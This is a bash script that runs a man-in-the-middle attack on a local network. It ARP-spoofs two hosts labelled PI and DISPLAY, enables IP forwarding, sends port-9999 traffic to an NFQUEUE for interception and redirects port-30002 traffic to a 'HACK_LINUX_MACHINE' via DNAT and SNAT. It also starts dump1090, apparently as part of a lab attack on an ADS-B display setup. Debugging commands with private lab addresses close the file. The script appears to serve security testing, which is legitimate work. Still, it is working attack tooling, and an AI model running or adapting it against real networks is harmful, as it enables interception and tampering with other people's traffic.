#!/usr/bin/env bash
set -eu

###############################################################################
# 1. User-tunable variables
###############################################################################
. $(dirname "$0")/config.sh
PORT=9999                               # TCP port to filter with NFQUEUE
QUEUE_NUM=1                             # NFQUEUE number
PORT_DUMP=30002                         # Port to redirect traffic to

###############################################################################
# 2. Root check – ensures the script is run as root
###############################################################################
if [ "$(id -u)" -ne 0 ]; then
  echo "Please run as root (e.g., sudo $0)" >&2
  exit 1
fi

###############################################################################
# 3. Save current kernel IP forwarding state to restore later
###############################################################################
ORIG_FORWARD=$(sysctl -n net.ipv4.ip_forward)

###############################################################################
# 4. Cleanup hook – runs automatically on EXIT / INT / TERM
###############################################################################
cleanup() {
  trap '' EXIT INT TERM
  echo "[*] Cleaning up…"

  # Remove the iptables rule inserted earlier
  iptables -D FORWARD -s "$PI_ADDRESS" -d "$DISPLAY_ADDRESS" \
           -p tcp --dport "$PORT" -j NFQUEUE --queue-num "$QUEUE_NUM"  \
           2>/dev/null || true

  # Restore the original kernel IP forwarding setting
  sysctl -w net.ipv4.ip_forward="$ORIG_FORWARD" >/dev/null

  # Flush PREROUTING rules in the nat table
  sudo iptables -t nat -F PREROUTING

  # Flush POSTROUTING rules in the nat table
  sudo iptables -t nat -F POSTROUTING

  # Kill all background processes started by this script
  kill -TERM $(pgrep -P $$) 2>/dev/null || true
  wait 
}
trap cleanup EXIT INT TERM

###############################################################################
# 5. One-time configuration that will be reverted in cleanup()
###############################################################################
echo "[*] Enabling IP forwarding temporarily…"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

echo "[*] Inserting temporary iptables rule…"
iptables -I FORWARD -s "$PI_ADDRESS" -d "$DISPLAY_ADDRESS" \
         -p tcp --dport "$PORT" -j NFQUEUE --queue-num "$QUEUE_NUM"

# Add DNAT rule to redirect traffic from DISPLAY_ADDRESS:PORT_DUMP to HACK_LINUX_MACHINE:PORT_DUMP
iptables -t nat -A PREROUTING  -p tcp --dport "$PORT_DUMP" \
        -s "$DISPLAY_ADDRESS"  -d "$PI_ADDRESS" \
        -j DNAT --to-destination "${HACK_LINUX_MACHINE}:${PORT_DUMP}"

# Add SNAT rule to rewrite source address for outgoing packets
iptables -t nat -A POSTROUTING -o "$INTERFACE" -p tcp --sport "$PORT_DUMP" \
        -s "$HACK_LINUX_MACHINE" -d "$DISPLAY_ADDRESS" \
        -j SNAT --to-source "$PI_ADDRESS"

###############################################################################
# 6. Launch long-running tools in the background
###############################################################################
# Start ARP spoofing between DISPLAY_ADDRESS and PI_ADDRESS
arpspoof -i "$INTERFACE" -t "$DISPLAY_ADDRESS" "$PI_ADDRESS" -r &
arpspoof -i "$INTERFACE" -t "$PI_ADDRESS"   "$DISPLAY_ADDRESS" -r &

# Start dump1090 in interactive net-only mode
$DUMP1090_PATH/dump1090 --interactive --net-only &

###############################################################################
# 7. Wait (blocks here).  Ctrl-C, ‘kill’, or normal exit triggers cleanup().
###############################################################################
wait

###############################################################################
# x. NOTE
###############################################################################
# Useful commands for debugging and monitoring:
# Check traffic between PI and DISPLAY
# sudo tcpdump -i eth1 host 192.168.157.15 and host 192.168.157.16
# Insert NFQUEUE rule manually
# sudo iptables -I FORWARD -s 192.168.157.15 -d 192.168.157.16 -p tcp --dport 9999 -j NFQUEUE --queue-num 1
# List iptables rules
# sudo iptables -L -v -n --line-numbers
# Show NFQUEUE rules
# sudo iptables -S | grep NFQUEUE
# Delete iptables rule
# sudo iptables -D 
# Capture packets with tshark
# tshark -i eth1 -f "host 192.168.157.15 and host 192.168.157.16" -w output.pcap 
# tshark -i eth1 -f "host 192.168.157.14 and host 192.168.157.194" -w output.pcap 
# Check which process is listening on port 30002
# sudo lsof -iTCP:30002 -sTCP:LISTEN -Pn
# List PREROUTING rules in the nat table
# sudo iptables -t nat -L PREROUTING  -n -v --line-numbers
# List POSTROUTING rules in the nat table
# sudo iptables -t nat -L POSTROUTING -n -v --line-numbers
# Flush PREROUTING rules in the nat table
# sudo iptables -t nat -F PREROUTING
# Flush POSTROUTING rules in the nat table
# sudo iptables -t nat -F POSTROUTING